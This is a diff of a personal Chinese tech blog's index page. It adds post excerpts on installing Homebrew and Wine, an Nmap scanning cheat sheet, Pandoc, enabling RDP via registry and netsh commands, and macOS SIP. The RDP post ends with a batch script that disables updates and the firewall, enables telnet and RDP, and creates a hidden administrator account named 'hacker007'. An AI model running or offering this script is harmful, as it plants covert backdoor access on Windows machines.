@@ -12,67 +12,556 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mr.Bingo's Blog">
   
-    <link rel="alternate" href="/atom.xml" title="Mr.Bingo&#39;s Blog" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="Mr.Bingo&#39;s Blog" type="application/atom+xml">
   
   
-    <link rel="icon" href="/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
   
   
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
   
   <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
   
-
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
 </head>
-
 <body>
   <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Mr.Bingo&#39;s Blog</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">所有走过的路  都是必经之路</a>
-        </h2>
-      
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Mr.Bingo</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">所有走过的路  都是必经之路</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/Home">博客首页</a></li>
+                        
+                            <li><a href="/works">作品展示</a></li>
+                        
+                            <li><a href="/about">留言打卡</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=XywwMTg4MDE4PTYxHys_LCxxPDAycTwx" title="mail">mail</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/5017379844/" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/OddBoyCN" title="twitter">twitter</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">纯海迷、爱运动、爱交友、爱旅行、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://oddboy.cn"></form>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Mr.Bingo</a></h1>
       </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Mr.Bingo</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">所有走过的路  都是必经之路</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/Home">博客首页</a></li>
+                
+                    <li><a href="/works">作品展示</a></li>
+                
+                    <li><a href="/about">留言打卡</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=XywwMTg4MDE4PTYxHys_LCxxPDAycTwx" title="mail">mail</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/5017379844/" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/OddBoyCN" title="twitter">twitter</a>
+                    
+                </div>
+            </nav>
+        </header>                
     </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
+</nav>
+      <div class="body-wrap">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/04/hello-world/" class="article-date">
-  <time datetime="2017-04-06T12:39:17.000Z" itemprop="datePublished">2017-04-06</time>
+    <article id="post-install-homebrew-and-wine-on-mac" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/install-homebrew-and-wine-on-mac/" class="article-date">
+      <time datetime="2017-05-16T06:02:17.000Z" itemprop="datePublished">2017-05-16</time>
 </a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/install-homebrew-and-wine-on-mac/">install homebrew and wine on mac</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="wine安装"><a href="#wine安装" class="headerlink" title="wine安装"></a>wine安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 安装homebrew</span></div><div class="line">/usr/bin/ruby <span class="_">-e</span> <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div><div class="line"></div><div class="line"><span class="comment"># 安装wine</span></div><div class="line">brew install wine</div><div class="line"><span class="comment"># 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!</span></div><div class="line"><span class="comment"># 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：</span></div><div class="line">brew cask install xquartz</div><div class="line"></div><div class="line"><span class="comment"># 安装成功后，再次：</span></div><div class="line">brew install wine</div><div class="line"></div><div class="line"><span class="comment"># 检查wine 安装状态</span></div><div class="line">wine --version</div><div class="line"></div><div class="line"><span class="comment"># 使用wine打开exe程序</span></div><div class="line">wine winfile.exe</div></pre></td></tr></table></figure>
+<p>brew cask :: <a href="http://caskroom.github.io" target="_blank" rel="external">http://caskroom.github.io</a></p>
+<p>XQuartz :: <a href="https://www.xquartz.org" target="_blank" rel="external">https://www.xquartz.org</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
     
   </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Nmap-cheat-sheet" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/Nmap-cheat-sheet/" class="article-date">
+      <time datetime="2017-05-07T10:47:45.000Z" itemprop="datePublished">2017-05-07</time>
+</a>
+    </div>
+  
   <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/Nmap-cheat-sheet/">Nmap cheat sheet</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><a href="http://www.91ri.org/8654.html" target="_blank" rel="external">http://www.91ri.org/8654.html</a></p>
+<h2 id="Nmap-介绍"><a href="#Nmap-介绍" class="headerlink" title="Nmap 介绍"></a>Nmap 介绍</h2><p><img src="http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG" alt="功能架构图"></p>
+<h3 id="四项基本功能"><a href="#四项基本功能" class="headerlink" title="四项基本功能"></a>四项基本功能</h3><ul>
+<li><p>主机发现（Host Discovery）</p>
+</li>
+<li><p>端口扫描（Port Scanning）</p>
+</li>
+<li><p>版本侦测（Version Detection）</p>
+</li>
+<li><p>操作系统侦测（Operating System Detection）</p>
+<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>
+</li>
+</ul>
+<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class="comment"># 多主机地址扫描</span></div><div class="line">nmap -A -T4 host        </div><div class="line"><span class="comment"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class="line"><span class="comment"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>
+<h2 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nmap IP/Hostname                    <span class="comment"># 最基本的使用情况</span></div><div class="line">nmap host1 host2 host3 etc...       <span class="comment"># 扫描多主机</span></div><div class="line">nmap 192.168.0.1-192.168.1.254      <span class="comment"># 扫描IP地址段</span></div><div class="line">nmap 192.168.0.1/23                 <span class="comment"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class="line">nmap -iL list.txt                   <span class="comment"># 扫描目标主机列表</span></div><div class="line">nmap -Pn host                       <span class="comment"># 假定目标存活</span></div></pre></td></tr></table></figure>
+<h2 id="高级使用"><a href="#高级使用" class="headerlink" title="高级使用"></a>高级使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A host                        <span class="comment"># ？？？？？？？</span></div></pre></td></tr></table></figure>
+<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><hr>
+<h2 id="渗透测试中不常用-我反正没用过"><a href="#渗透测试中不常用-我反正没用过" class="headerlink" title="渗透测试中不常用(我反正没用过)"></a>渗透测试中不常用(我反正没用过)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class="comment"># 排除一些主机</span></div><div class="line">nmap -iR 100                        <span class="comment"># 随机扫描互联网上100个主机</span></div><div class="line">nmap -Sp                            <span class="comment"># 只ping扫描，</span></div><div class="line">nmap -PS                            <span class="comment"># TCP SYN scan (TCP SYN ping)</span></div><div class="line">nmap -PA                            <span class="comment"># TCP ACK scan ping</span></div><div class="line">nmap -PU                            <span class="comment"># UDP scan  ping</span></div><div class="line">nmap -PY                            <span class="comment"># ??? SCTP scan ping</span></div><div class="line">nmap -PE/PP/PM                      <span class="comment"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class="line">nmap -PO [protocol] host            <span class="comment"># 指定协议ping</span></div><div class="line">nmap -PR                            <span class="comment"># ??? ARP ping </span></div><div class="line">nmap --traceroute                   <span class="comment"># traceroute 功能 探测网络路径</span></div><div class="line">nmap -n/-R                          <span class="comment"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class="line">nmap --dns-servers serv1,serv2,,,   <span class="comment"># 指定DNS</span></div><div class="line">nmap --system-dns                   <span class="comment"># 使用系统DNS</span></div><div class="line">nmap <span class="_">-s</span>L IPs                        <span class="comment"># 列出IPs的反向DNS结果</span></div><div class="line">nmap</div></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://resources.infosecinstitute.com/nmap-cheat-sheet/" target="_blank" rel="external">Introduction to Nmap</a></p>
+<p><a href="http://www.freebuf.com/articles/network/32302.html" target="_blank" rel="external">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>
+<h2 id="零散知识"><a href="#零散知识" class="headerlink" title="#零散知识"></a>#零散知识</h2><h4 id="Nmap脚本引擎-NSE"><a href="#Nmap脚本引擎-NSE" class="headerlink" title="Nmap脚本引擎(NSE)"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测
+- 漏洞检测
+- 漏洞利用
+</code></pre><h4 id="端口状态说明"><a href="#端口状态说明" class="headerlink" title="端口状态说明"></a>端口状态说明</h4><ul>
+<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>
+</li>
+<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>
+</li>
+<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>
+</li>
+<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>
+</li>
+<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>
+</li>
+<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Pandoc-a-universal-document-converter" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/Pandoc-a-universal-document-converter/" class="article-date">
+      <time datetime="2017-05-02T02:02:42.000Z" itemprop="datePublished">2017-05-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/Pandoc-a-universal-document-converter/">Pandoc | a universal document converter</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>
+<p>官方主页: <a href="http://www.pandoc.org" target="_blank" rel="external">http://www.pandoc.org</a></p>
+<p>Get Start: <a href="http://www.pandoc.org/getting-started.html" target="_blank" rel="external">http://www.pandoc.org/getting-started.html</a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew install pandoc     <span class="comment"># 简单到爆</span></div><div class="line">pandoc --verison        <span class="comment"># 查看版本</span></div></pre></td></tr></table></figure>
+<h2 id="转换文件"><a href="#转换文件" class="headerlink" title="转换文件"></a>转换文件</h2><p>Demos : <a href="http://www.pandoc.org/demos.html" target="_blank" rel="external">http://www.pandoc.org/demos.html</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pandoc test.md <span class="_">-f</span> markdown -t html <span class="_">-s</span> -o test.html</div><div class="line"><span class="comment"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class="line"></div><div class="line">pandoc <span class="_">-s</span> -S MANUAL.txt -o example29.docx</div><div class="line"></div><div class="line">pandoc <span class="built_in">source</span>/_posts/Pandoc<span class="_">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>
+<p><img src="/Users/jason/TempDocs/123.jpg" alt="本地图片"><br><img src="https://images.apple.com/v/home/df/images/promos/airpods_large.jpg" alt="远程图片"></p>
+<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Enable-RDP-through-cmd-line" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/04/Enable-RDP-through-cmd-line/" class="article-date">
+      <time datetime="2017-04-26T11:21:29.000Z" itemprop="datePublished">2017-04-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/Enable-RDP-through-cmd-line/">Enable RDP through cmd line</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="开启RDP"><a href="#开启RDP" class="headerlink" title="开启RDP"></a>开启RDP</h2><p>通过命令行修改注册表。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 开启RDP</span></div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class="line"><span class="comment"># 关闭RDP</span></div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class="line"><span class="comment"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class="line">reg query <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>
+<h2 id="RDP端口"><a href="#RDP端口" class="headerlink" title="RDP端口"></a>RDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 查询rdp端口号</span></div><div class="line">reg query <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber</div></pre></td></tr></table></figure>
+<h2 id="防火墙相关-Netsh-AdvFirewall-aspx"><a href="#防火墙相关-Netsh-AdvFirewall-aspx" class="headerlink" title="防火墙相关 Netsh AdvFirewall.aspx)"></a>防火墙相关 <a href="https://technet.microsoft.com/en-us/library/dd736198(v=ws.10" target="_blank" rel="external">Netsh AdvFirewall</a>.aspx)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 防火墙状态</span></div><div class="line">netsh advfirewall monitor show firewall</div><div class="line"></div><div class="line"><span class="comment"># 允许访问3389端口</span></div><div class="line">netsh advfirewall firewall add rule name=<span class="string">"Open Port 3389"</span> dir=<span class="keyword">in</span> action=allow protocol=TCP localport=3389</div><div class="line"></div><div class="line"><span class="comment"># 关闭防火墙</span></div><div class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></div></pre></td></tr></table></figure>
+<h2 id="开启远程协助"><a href="#开启远程协助" class="headerlink" title="开启远程协助"></a>开启远程协助</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 从进程中查找rdp进程</span></div><div class="line">tasklist  /svc | find <span class="string">"TermService"</span></div><div class="line"><span class="comment"># 根据pid（1316）查询端口号</span></div><div class="line">netstat -ano | find <span class="string">"1316"</span></div></pre></td></tr></table></figure>
+<h2 id="脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt"><a href="#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt" class="headerlink" title="脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">@<span class="built_in">echo</span> off</div><div class="line"></div><div class="line">REM ****************</div><div class="line">REM Disable off <span class="string">"AUTO UPDATE"</span></div><div class="line">REM ****************</div><div class="line">sc config wuauserv start= disabled</div><div class="line">net stop wuauserv</div><div class="line"></div><div class="line">REM ****************</div><div class="line">REM Disable windows xp Firewall</div><div class="line">REM ****************</div><div class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span></div><div class="line"></div><div class="line">REM ****************</div><div class="line">REM Enable TELNET</div><div class="line">REM ****************</div><div class="line">sc config tlntsvr start= auto</div><div class="line">net start telnet</div><div class="line"></div><div class="line">REM ****************</div><div class="line">REM Enable Remote Desktop</div><div class="line">REM ****************</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class="line"></div><div class="line">REM ***************</div><div class="line">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class="line">REM ***************</div><div class="line">net user hacker007 dani /add</div><div class="line">net localgroup <span class="string">"Administrators"</span> /add hacker007</div><div class="line">net localgroup <span class="string">"Users"</span> /del hacker007</div><div class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Mac-SIP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/04/Mac-SIP/" class="article-date">
+      <time datetime="2017-04-26T11:19:03.000Z" itemprop="datePublished">2017-04-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/Mac-SIP/">MacOS - SIP (System Integrity Protection) 系统集成保护</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="Mac-SIP-系统集成保护"><a href="#Mac-SIP-系统集成保护" class="headerlink" title="Mac - SIP 系统集成保护"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href="https://support.apple.com/en-us/HT204899" target="_blank" rel="external">About System Integrity Protection on your Mac</a></p>
+<h2 id="开启-关闭SIP"><a href="#开启-关闭SIP" class="headerlink" title="开启/关闭SIP"></a>开启/关闭SIP</h2><p>参考来源 <a href="http://www.jianshu.com/p/0572336a0771" target="_blank" rel="external">http://www.jianshu.com/p/0572336a0771</a></p>
+<h3 id="1-进入Recovery-Mode"><a href="#1-进入Recovery-Mode" class="headerlink" title="1.进入Recovery Mode"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>
+<h3 id="2-使用csrutil命令"><a href="#2-使用csrutil命令" class="headerlink" title="2.使用csrutil命令"></a>2.使用csrutil命令</h3><p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">➜  ~ csrutil</div><div class="line">usage: csrutil &lt;<span class="built_in">command</span>&gt;</div><div class="line">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class="line">Available commands:</div><div class="line"></div><div class="line">    clear</div><div class="line">        Clear the existing configuration. Only available <span class="keyword">in</span> Recovery OS.</div><div class="line">    <span class="built_in">disable</span></div><div class="line">        Disable the protection on the machine. Only available <span class="keyword">in</span> Recovery OS.</div><div class="line">    <span class="built_in">enable</span></div><div class="line">        Enable the protection on the machine. Only available <span class="keyword">in</span> Recovery OS.</div><div class="line">    status</div><div class="line">        Display the current configuration.</div><div class="line"></div><div class="line">    netboot</div><div class="line">        add &lt;address&gt;</div><div class="line">            Insert a new IPv4 address <span class="keyword">in</span> the list of allowed NetBoot sources.</div><div class="line">        list</div><div class="line">            Print the list of allowed NetBoot sources.</div><div class="line">        remove &lt;address&gt;</div><div class="line">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>
+<p>正常系统模式下仅可以用status命令查询SIP状态</p>
